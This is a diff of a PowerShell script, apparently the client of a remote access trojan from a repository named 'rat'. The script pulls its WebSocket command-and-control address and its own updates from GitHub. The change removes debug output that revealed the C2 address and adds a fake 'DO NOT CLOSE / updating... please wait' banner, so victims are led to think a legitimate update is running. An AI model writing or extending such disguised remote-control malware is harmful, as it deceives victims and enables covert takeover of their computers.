@@ -1,7 +1,7 @@
 
 # --- CONFIGURACIÓN DEL AUTO-UPDATER ---
 # ** IMPORTANTE **: Actualiza la versión local si haces cambios que no se autoupdatean
-$CurrentScriptVersion = "1.0.2" # Incrementamos la versión por los ajustes de depuración
+$CurrentScriptVersion = "1.0.3" # Incrementamos la versión por los ajustes de depuración
 
 # URLs de actualización (asegúrate de que sean las correctas y accesibles)
 $VersionCheckUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/version"
@@ -25,14 +25,25 @@ Add-Type -AssemblyName System.Windows.Forms
 # --- OBTENER URI DESDE GITHUB ---
 $uri = $null
 try {
-    Write-Host "Obteniendo WebSocket URI desde $UriConfigUrl..."
     # Usar -UseBasicParsing para Invoke-RestMethod en entornos sin Internet Explorer
     $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
     $uri = $uri.Trim()
     if ([string]::IsNullOrWhiteSpace($uri)) {
         throw "La URI obtenida está vacía o es nula."
     }
-    Write-Host "URI cargada: $uri"
+    Clear-Host
+    Write-Host "                            __              __                         "
+    Write-Host "                           /  |            /  |                        "
+    Write-Host "  __    __   ______    ____$$ |  ______   _$$ |_     ______    ______  "
+    Write-Host " /  |  /  | /      \  /    $$ | /      \ / $$   |   /      \  /      \ "
+    Write-Host " $$ |  $$ |/$$$$$$  |/$$$$$$$ | $$$$$$  |$$$$$$/   /$$$$$$  |/$$$$$$  |"
+    Write-Host " $$ |  $$ |$$ |  $$ |$$ |  $$ | /    $$ |  $$ | __ $$    $$ |$$ |  $$/ "
+    Write-Host " $$ \__$$ |$$ |__$$ |$$ \__$$ |/$$$$$$$ |  $$ |/  |$$$$$$$$/ $$ |      "
+    Write-Host " $$    $$/ $$    $$/ $$    $$ |$$    $$ |  $$  $$/ $$       |$$ |      "
+    Write-Host "  $$$$$$/  $$$$$$$/   $$$$$$$/  $$$$$$$/    $$$$/   $$$$$$$/ $$/       "
+    Write-Host "           $$ |                    DO NOT CLOSE                                    "
+    Write-Host "           $$ |                updating... please wait                    "                    
+    Write-Host "           $$/                                                     "
 } catch {
     Write-Error "No se pudo obtener la URI del WebSocket. Error: $($_.Exception.Message)"
     # Si no podemos obtener la URI, no podemos continuar. Salimos.
